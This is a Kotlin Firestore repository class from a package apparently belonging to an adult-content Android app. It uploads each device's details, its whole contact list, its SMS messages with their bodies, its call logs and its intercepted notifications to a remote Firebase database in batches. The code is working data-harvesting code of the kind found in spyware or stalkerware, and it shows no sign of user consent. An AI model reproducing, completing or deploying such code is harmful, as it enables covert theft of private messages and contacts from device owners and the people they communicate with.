package com.boxx.porn.data

import com.boxx.porn.model.*
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import java.security.MessageDigest
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FirestoreRepository @Inject constructor(
    private val db: FirebaseFirestore
) {

    suspend fun updateDeviceInfo(deviceInfo: DeviceInfo) {
        db.collection("devices")
            .document(deviceInfo.deviceId)
            .set(deviceInfo)
            .await()
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("contacts")

        val chunks = contacts.chunked(500)
        for (chunk in chunks) {
            val batch = db.batch()
            chunk.forEach { contact ->
                val docId = hashString(contact.phone)
                val docRef = collectionRef.document(docId)
                batch.set(docRef, contact)
            }
            batch.commit().await()
        }
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("sms")

        val chunks = smsList.chunked(500)
        for (chunk in chunks) {
            val batch = db.batch()
            chunk.forEach { sms ->
                val docId = hashString("${sms.address}${sms.date}${sms.body}")
                val docRef = collectionRef.document(docId)
                batch.set(docRef, sms)
            }
            batch.commit().await()
        }
    }

    suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("calllogs")

        val chunks = callLogs.chunked(500)
        for (chunk in chunks) {
            val batch = db.batch()
            chunk.forEach { log ->
                val docId = hashString("${log.number}${log.date}${log.type}")
                val docRef = collectionRef.document(docId)
                batch.set(docRef, log)
            }
            batch.commit().await()
        }
    }

    suspend fun syncNotification(deviceId: String, notification: NotificationData) {
        val docId = hashString("${notification.packageName}${notification.timestamp}${notification.title}")
        val deviceRef = db.collection("devices").document(deviceId)

        db.runTransaction { transaction ->
            val snapshot = transaction.get(deviceRef)
            val currentCount = snapshot.getLong("notificationCount") ?: 0L

            transaction.set(deviceRef.collection("notifications").document(docId), notification)
            transaction.update(deviceRef, "notificationCount", currentCount + 1, "lastSyncTime", System.currentTimeMillis())
        }.await()
    }

    private fun hashString(input: String): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(input.toByteArray())
            .joinToString("") { "%02x".format(it) }
    }
}
